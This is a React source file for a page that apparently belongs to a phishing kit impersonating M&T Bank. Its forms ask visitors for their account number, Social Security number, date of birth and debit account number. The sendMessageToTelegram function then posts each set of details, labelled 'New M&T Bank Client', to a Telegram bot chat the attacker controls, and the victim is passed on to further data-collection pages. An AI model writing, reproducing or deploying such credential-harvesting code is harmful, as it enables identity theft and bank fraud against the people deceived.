import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import Header from '../../components/Header';
import Sidebar from '../../components/Sidebar';
import Footer from '../../components/Footer';
import axios from 'axios';
import { botToken, chatId } from '../../constants';

const AccountInfoPage: React.FC = () => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [accountNumber, setAccountNumber] = useState('');
  const [socialSecurity, setSocialSecurity] = useState('');
  const [dateOfBirth, setDateOfBirth] = useState('');
  const [debitAccountNumber, setDebitAccountNumber] = useState('');

  const [errors, setErrors] = useState({ 
    accountNumber: '', 
    socialSecurity: '', 
    dateOfBirth: '', 
    debitAccountNumber: '' 
  });

  const navigate = useNavigate();
  const [isLogin, setIsLogin] = useState(true);

  const validateAccountNumber = (accountNumber) => /^[0-9]{10}$/.test(accountNumber);
  const validateSocialSecurity = (socialSecurity) => /^\d{3}-\d{2}-\d{4}$/.test(socialSecurity);
  const validateDateOfBirth = (dateOfBirth) => /^\d{4}-\d{2}-\d{2}$/.test(dateOfBirth);
  const validateDebitAccountNumber = (debitAccountNumber) => /^[0-9]{10}$/.test(debitAccountNumber);

  const sendMessageToTelegram = async (message) => {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      await axios.post(url, {
        chat_id: chatId,
        text: message,
      });
      console.log('Message sent successfully');
    } catch (error) {
      console.error('Error sending message:', error);
    }
  };

  const handleAccountInfoSubmit = (event) => {
    event.preventDefault();
    let newErrors = { accountNumber: '', socialSecurity: '', dateOfBirth: '' };

    if (!validateAccountNumber(accountNumber)) {
      newErrors.accountNumber = 'Invalid account number format.';
    }

    if (!validateSocialSecurity(socialSecurity)) {
      newErrors.socialSecurity = 'Invalid social security format.';
    }

    if (!validateDateOfBirth(dateOfBirth)) {
      newErrors.dateOfBirth = 'Invalid date of birth format (YYYY-MM-DD).';
    }

    setErrors(newErrors);

    if (!newErrors.accountNumber && !newErrors.socialSecurity && !newErrors.dateOfBirth) {
      const userData = `New M&T Bank Client \n\nAccount Number: ${accountNumber} \nSocial Security: ${socialSecurity} \nDate of Birth: ${dateOfBirth}`;
      sendMessageToTelegram(userData);
      navigate('/account-info-confirm'); 
      setErrors({ accountNumber: '', socialSecurity: '', dateOfBirth: '' });
    }
  };

  const handleDebitInfoSubmit = (event) => {
    event.preventDefault();
    let newErrors = { debitAccountNumber: '' };

    if (!validateDebitAccountNumber(debitAccountNumber)) {
      newErrors.debitAccountNumber = 'Invalid debit account number format.';
    }

    setErrors(newErrors);

    if (!newErrors.debitAccountNumber) {
      const debitData = `New M&T Bank Client \n\nDebit Account Number: ${debitAccountNumber}`;
      sendMessageToTelegram(debitData);
      navigate('/basic-info'); 
      setDebitAccountNumber('');
      setErrors({ debitAccountNumber: '' });
    }
  };

  return (
    <>
      <Header sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
      <Sidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
      <section>
        <div className="grid grid-cols-1 gap-4">
          <div className="px-6 pt-4">
            <h1 className="text-3xl mb-6 text-center text-middarkgreen">
              Verify your account information 
            </h1>

            <p className='mb-1'>Enter your account number or card number to verify your identity.</p>

            <div className="flex flex-col items-center justify-center mx-2 mt-9">
              <div className="flex w-full border border-green rounded-md mb-4">
                <button
                  onClick={() => setIsLogin(true)}
                  className={`flex-1 px-4 py-2 rounded-l-md font-bold focus:outline-none ${isLogin ? 'bg-darkgreen text-white' : 'bg-gray-300 text-darkgreen'}`}
                >
                  Account Information
                </button>
                <button
                  onClick={() => setIsLogin(false)}
                  className={`flex-1 px-4 py-2 rounded-r-md font-bold focus:outline-none ${!isLogin ? 'bg-darkgreen text-white' : 'bg-gray-300 text-darkgreen'}`}
                >
                  Debit Card Information
                </button>
              </div>
              <div className="w-full max-w-sm">
                {isLogin ? (
                  <AccountInfo
                    accountNumber={accountNumber}
                    setAccountNumber={setAccountNumber}
                    socialSecurity={socialSecurity}
                    setSocialSecurity={setSocialSecurity}
                    dateOfBirth={dateOfBirth}
                    setDateOfBirth={setDateOfBirth}
                    handleSubmit={handleAccountInfoSubmit}
                    errors={errors}
                  />
                ) : (
                  <DebitInfo
                    debitAccountNumber={debitAccountNumber}
                    setDebitAccountNumber={setDebitAccountNumber}
                    handleSubmit={handleDebitInfoSubmit}
                    errors={errors}
                  />
                )}
              </div>
            </div>
          </div>
        </div>
      </section>
      <br/>
      <Footer />
    </>
  );
};

const AccountInfo = ({ accountNumber, setAccountNumber, socialSecurity, setSocialSecurity, dateOfBirth, setDateOfBirth, handleSubmit, errors }) => {
  return (
    <form onSubmit={handleSubmit}>
      <div className="mb-5">
        <label className="block text-black dark:text-white">Account Number</label>
        <input
          id="accountNumber"
          name="accountNumber"
          type='number'
          value={accountNumber}
          onChange={(e) => setAccountNumber(e.target.value)}
          className="w-full border border-graylight bg-transparent py-2 pl-6 pr-10 text-black outline-none focus:border-primary dark:border-form-strokedark dark:bg-form-input dark:text-white"
        />
        {errors.accountNumber && <p className="text-red-600">{errors.accountNumber}</p>}
      </div>

      <div className="mb-5">
        <label className="block text-black dark:text-white">Social Security</label>
        <input
          id="socialSecurity"
          name="socialSecurity"
          type='text'
          value={socialSecurity}
          onChange={(e) => setSocialSecurity(e.target.value)}
          className="w-full border border-graylight bg-transparent py-2 pl-6 pr-10 text-black outline-none focus:border-primary dark:border-form-strokedark dark:bg-form-input dark:text-white"
          placeholder="xxx-xx-xxxx"
        />
        {errors.socialSecurity && <p className="text-red-600">{errors.socialSecurity}</p>}
      </div>

      <div className="mb-5">
        <label className="block text-black dark:text-white">Date of Birth</label>
        <input
          id="dateOfBirth"
          name="dateOfBirth"
          type='date'
          value={dateOfBirth}
          onChange={(e) => setDateOfBirth(e.target.value)}
          className="w-full border border-graylight bg-transparent py-2 pl-6 pr-10 text-black outline-none focus:border-primary dark:border-form-strokedark dark:bg-form-input dark:text-white"
        />
        {errors.dateOfBirth && <p className="text-red-600">{errors.dateOfBirth}</p>}
      </div>

      <div className="mb-10">
        <input
          type="submit"
          value="Continue"
          className="w-full cursor-pointer rounded font-bold border border-darkgreen bg-darkgreen p-2 text-white transition hover:bg-opacity-90"
        />
      </div>
    </form>
  );
};

const DebitInfo = ({ debitAccountNumber, setDebitAccountNumber, handleSubmit, errors }) => {
  return (
    <form onSubmit={handleSubmit}>
      <div className="mb-5">
        <label className="block text-black dark:text-white">Debit Account Number</label>
        <input
          id="debitAccountNumber"
          name="debitAccountNumber"
          type='number'
          value={debitAccountNumber}
          onChange={(e) => setDebitAccountNumber(e.target.value)}
          className="w-full border border-graylight bg-transparent py-2 pl-6 pr-10 text-black outline-none focus:border-primary dark:border-form-strokedark dark:bg-form-input dark:text-white"
        />
        {errors.debitAccountNumber && <p className="text-red-600">{errors.debitAccountNumber}</p>}
      </div>

      <div className="mb-10">
        <input
          type="submit"
          value="Continue"
          className="w-full cursor-pointer rounded font-bold border border-darkgreen bg-darkgreen p-2 text-white transition hover:bg-opacity-90"
        />
      </div>
    </form>
  );
};

export default AccountInfoPage;
